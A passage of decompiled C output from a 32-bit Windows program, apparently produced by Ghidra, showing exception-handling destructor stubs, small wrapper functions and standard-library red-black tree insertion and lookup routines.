  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_004125d4(void *this,int param_1)

{
  void *this_00;
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    uVar2 = FUN_00414695(this_00,param_1,(char **)(param_1 + 8));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      uVar2 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar2;
      return CONCAT31((int3)((uint)uVar2 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



undefined4 * __fastcall FUN_00412642(undefined4 *param_1)

{
  FUN_00412792(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412650(undefined4 *param_1)

{
  FUN_00412810(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0041265e(undefined4 *param_1)

{
  FUN_00412848(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0041266c(undefined4 *param_1)

{
  FUN_004128ed(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0041267a(undefined4 *param_1)

{
  FUN_00412925(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412688(undefined4 *param_1)

{
  FUN_004129b2(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412696(undefined4 *param_1)

{
  FUN_004129ea(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004126a4(undefined4 *param_1)

{
  FUN_00412a68(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004126b2(undefined4 *param_1)

{
  FUN_00412aa0(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004126c0(undefined4 *param_1)

{
  FUN_00412b1e(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004126ce(undefined4 *param_1)

{
  FUN_00412b56(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004126dc(undefined4 *param_1)

{
  FUN_00412bd4(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004126ea(undefined4 *param_1)

{
  FUN_00412c0c(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004126f8(undefined4 *param_1)

{
  FUN_00412c8a(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412706(undefined4 *param_1)

{
  FUN_00412cc2(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412714(undefined4 *param_1)

{
  FUN_00412d40(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412722(undefined4 *param_1)

{
  FUN_00412d78(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412730(undefined4 *param_1)

{
  FUN_00412df6(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0041273e(undefined4 *param_1)

{
  FUN_00412e2e(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0041274c(undefined4 *param_1)

{
  FUN_00412eac(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_0041275a(undefined4 *param_1)

{
  FUN_00412ee4(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412768(undefined4 *param_1)

{
  FUN_00412f62(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412776(undefined4 *param_1)

{
  FUN_00412f9a(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_00412784(undefined4 *param_1)

{
  FUN_00413018(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412792(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004160b4;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004185c0;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_004127ca(undefined4 *param_1)

{
  FUN_004127d8(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004127d8(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004160c8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004185c0;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412810(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004160dc;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004185c0;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412848(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004160f0;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004185f4;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



void __thiscall FUN_00412880(void *this,undefined4 *param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  void *local_c;
  void *pvStack_8;
  
  local_c = this;
  pvStack_8 = this;
  puVar1 = (undefined4 *)(**(code **)(**(int **)((int)this + 8) + 0x2c))(&local_c,param_2);
  *param_1 = *puVar1;
  param_1[1] = puVar1[1];
  return;
}



undefined4 * __fastcall FUN_004128a7(undefined4 *param_1)

{
  FUN_004128b5(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004128b5(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416104;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004185f4;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004128ed(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416118;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004185f4;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412925(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041612c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418628;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_0041296c(undefined4 *param_1)

{
  FUN_0041297a(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0041297a(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416140;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418628;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004129b2(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416154;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418628;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004129ea(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416168;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_0041865c;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412a22(undefined4 *param_1)

{
  FUN_00412a30(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412a30(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041617c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_0041865c;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412a68(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416190;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_0041865c;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412aa0(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004161a4;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418690;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412ad8(undefined4 *param_1)

{
  FUN_00412ae6(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412ae6(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004161b8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418690;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412b1e(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004161cc;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418690;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412b56(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004161e0;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004186c4;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412b8e(undefined4 *param_1)

{
  FUN_00412b9c(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412b9c(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004161f4;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004186c4;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412bd4(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416208;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004186c4;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412c0c(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041621c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004186f8;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412c44(undefined4 *param_1)

{
  FUN_00412c52(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412c52(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416230;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004186f8;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412c8a(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416244;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004186f8;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412cc2(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416258;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_0041872c;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412cfa(undefined4 *param_1)

{
  FUN_00412d08(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412d08(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041626c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_0041872c;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412d40(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416280;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_0041872c;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412d78(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416294;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418760;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412db0(undefined4 *param_1)

{
  FUN_00412dbe(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412dbe(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004162a8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418760;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412df6(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004162bc;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418760;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412e2e(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004162d0;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418794;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412e66(undefined4 *param_1)

{
  FUN_00412e74(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412e74(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004162e4;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418794;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412eac(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004162f8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00418794;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412ee4(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041630c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004187c8;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412f1c(undefined4 *param_1)

{
  FUN_00412f2a(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412f2a(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416320;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004187c8;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412f62(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416334;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004187c8;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412f9a(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416348;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004187fc;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00412fd2(undefined4 *param_1)

{
  FUN_00412fe0(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00412fe0(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041635c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004187fc;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00413018(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416370;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004187fc;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



void __thiscall FUN_00413050(void *this,undefined4 *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 **ppuVar3;
  undefined4 *local_8;
  
  puVar1 = param_2;
  local_8 = (undefined4 *)this;
  puVar2 = FUN_0041334b(this,(char *)param_2);
  if ((puVar2 == *(undefined4 **)((int)this + 4)) || (*(char *)puVar1 < *(char *)(puVar2 + 3))) {
    local_8 = *(undefined4 **)((int)this + 4);
    ppuVar3 = &local_8;
  }
  else {
    ppuVar3 = &param_2;
  }
  *param_1 = *ppuVar3;
  return;
}



void __thiscall FUN_0041308a(void *this,int *param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  piVar3 = (int *)((int)this + 4);
  iVar4 = *piVar3;
  if (iVar4 != param_2) {
    if (param_3 == 0) goto LAB_004130a7;
    iVar1 = *(int *)(param_3 + 4);
    iVar2 = iVar4;
    while (iVar4 = iVar2, iVar1 != param_2) {
LAB_004130a7:
      iVar1 = *(int *)(iVar4 + 4);
      iVar2 = iVar1;
      param_3 = iVar4;
    }
    piVar3 = (int *)(param_3 + 4);
  }
  iVar4 = *(int *)(param_2 + 4);
  *piVar3 = iVar4;
  *param_1 = iVar4;
  return;
}



void __fastcall FUN_004130c4(int param_1)

{
  if (*(int **)(param_1 + 8) != (int *)0x0) {
    (**(code **)(**(int **)(param_1 + 8) + 0x18))(1);
  }
  *(undefined4 *)(param_1 + 8) = 0;
  return;
}



void __thiscall FUN_004130db(void *this,int **param_1,int *param_2)

{
  int **ppiVar1;
  int **ppiVar2;
  undefined4 local_10;
  int **local_c;
  char local_5;
  
  local_5 = '\x01';
  ppiVar1 = *(int ***)((int)this + 4);
  ppiVar2 = (int **)ppiVar1[1];
  std::_Lockit::_Lockit((_Lockit *)&local_10);
  if (ppiVar2 != DAT_0041c9ac) {
    do {
      ppiVar1 = ppiVar2;
      local_5 = *(char *)param_2 < *(char *)(ppiVar1 + 3);
      if ((bool)local_5) {
        ppiVar2 = (int **)*ppiVar1;
      }
      else {
        ppiVar2 = (int **)ppiVar1[2];
      }
    } while (ppiVar2 != DAT_0041c9ac);
  }
  std::_Lockit::~_Lockit((_Lockit *)&local_10);
  if (*(char *)((int)this + 8) == '\0') {
    local_c = ppiVar1;
    if (local_5 != '\0') {
      if (ppiVar1 == (int **)**(int **)((int)this + 4)) {
        ppiVar1 = FUN_004131cd(this,&param_2,(int *)ppiVar2,ppiVar1,(char *)param_2);
        local_10 = (int *)CONCAT31(local_10._1_3_,1);
        *param_1 = *ppiVar1;
        goto LAB_004131c3;
      }
      FUN_00413394((int **)&local_c);
    }
    if (*(char *)(local_c + 3) < *(char *)param_2) {
      ppiVar1 = FUN_004131cd(this,&param_2,(int *)ppiVar2,ppiVar1,(char *)param_2);
      local_10 = (int *)CONCAT31(local_10._1_3_,1);
      *param_1 = *ppiVar1;
    }
    else {
      local_10 = (int *)((uint)local_10 & 0xffffff00);
      *param_1 = (int *)local_c;
    }
  }
  else {
    ppiVar1 = FUN_004131cd(this,&param_2,(int *)ppiVar2,ppiVar1,(char *)param_2);
    local_10 = (int *)CONCAT31(local_10._1_3_,1);
    *param_1 = *ppiVar1;
  }
LAB_004131c3:
  param_1[1] = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

int ** __thiscall FUN_004131cd(void *this,int **param_1,int *param_2,int **param_3,char *param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int iVar4;
  int *piVar5;
  int **ppiVar6;
  void *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00416385;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_14 = this;
  std::_Lockit::_Lockit((_Lockit *)&local_14);
  local_8 = 0;
  ppiVar3 = (int **)operator_new(0x2c);
  ppiVar3[10] = (int *)0x0;
  ppiVar3[1] = (int *)param_3;
  *ppiVar3 = DAT_0041c9ac;
  ppiVar3[2] = DAT_0041c9ac;
  FUN_0041475c((undefined *)(ppiVar3 + 3),param_4);
  *(int *)((int)this + 0xc) = *(int *)((int)this + 0xc) + 1;
  if (((param_3 == *(int ***)((int)this + 4)) || (param_2 != DAT_0041c9ac)) ||
     (*param_4 < *(char *)(param_3 + 3))) {
    *param_3 = (int *)ppiVar3;
    ppiVar6 = *(int ***)((int)this + 4);
    if (param_3 != ppiVar6) {
      if (param_3 == (int **)*ppiVar6) {
        *ppiVar6 = (int *)ppiVar3;
      }
      goto LAB_0041325f;
    }
    ppiVar6[1] = (int *)ppiVar3;
    iVar4 = *(int *)((int)this + 4);
  }
  else {
    param_3[2] = (int *)ppiVar3;
    iVar4 = *(int *)((int)this + 4);
    if (param_3 != *(int ***)(iVar4 + 8)) goto LAB_0041325f;
  }
  *(int ***)(iVar4 + 8) = ppiVar3;
LAB_0041325f:
  ppiVar6 = ppiVar3;
  if (ppiVar3 != *(int ***)(*(int *)((int)this + 4) + 4)) {
    do {
      ppiVar1 = (int **)ppiVar6[1];
      if (ppiVar1[10] != (int *)0x0) break;
      ppiVar2 = (int **)ppiVar1[1];
      if (ppiVar1 == (int **)*ppiVar2) {
        piVar5 = ppiVar2[2];
        if (piVar5[10] == 0) {
LAB_0041328a:
          ppiVar1[10] = (int *)0x1;
          piVar5[10] = 1;
          *(undefined4 *)(ppiVar6[1][1] + 0x28) = 0;
          ppiVar6 = (int **)ppiVar6[1][1];
        }
        else {
          if (ppiVar6 == (int **)ppiVar1[2]) {
            FUN_0040a4af(this,(int *)ppiVar1);
            ppiVar6 = ppiVar1;
          }
          ppiVar6[1][10] = 1;
          *(undefined4 *)(ppiVar6[1][1] + 0x28) = 0;
          FUN_0040a53e(this,(int *)ppiVar6[1][1]);
        }
      }
      else {
        piVar5 = *ppiVar2;
        if (piVar5[10] == 0) goto LAB_0041328a;
        if (ppiVar6 == (int **)*ppiVar1) {
          FUN_0040a53e(this,(int *)ppiVar1);
          ppiVar6 = ppiVar1;
        }
        ppiVar6[1][10] = 1;
        *(undefined4 *)(ppiVar6[1][1] + 0x28) = 0;
        FUN_0040a4af(this,(int *)ppiVar6[1][1]);
      }
    } while (ppiVar6 != *(int ***)(*(int *)((int)this + 4) + 4));
  }
  local_8 = 0xffffffff;
  *(undefined4 *)(*(int *)(*(int *)((int)this + 4) + 4) + 0x28) = 1;
  *param_1 = (int *)ppiVar3;
  std::_Lockit::~_Lockit((_Lockit *)&local_14);
  ExceptionList = local_10;
  return param_1;
}



undefined4 * __thiscall FUN_0041334b(void *this,char *param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  void *local_8;
  
  local_8 = this;
  std::_Lockit::_Lockit((_Lockit *)&local_8);
  puVar3 = *(undefined4 **)((int)this + 4);
  if ((undefined4 *)puVar3[1] != DAT_0041c9ac) {
    puVar1 = (undefined4 *)puVar3[1];
    do {
      if (*(char *)(puVar1 + 3) < *param_1) {
        puVar2 = (undefined4 *)puVar1[2];
      }
      else {
        puVar2 = (undefined4 *)*puVar1;
        puVar3 = puVar1;
      }
      puVar1 = puVar2;
    } while (puVar2 != DAT_0041c9ac);
  }
  std::_Lockit::~_Lockit((_Lockit *)&local_8);
  return puVar3;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00413394(int **param_1)

{
  int **ppiVar1;
  int **local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00416399;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_14 = param_1;
  std::_Lockit::_Lockit((_Lockit *)&local_14);
  ppiVar1 = (int **)*param_1;
  local_8 = 0;
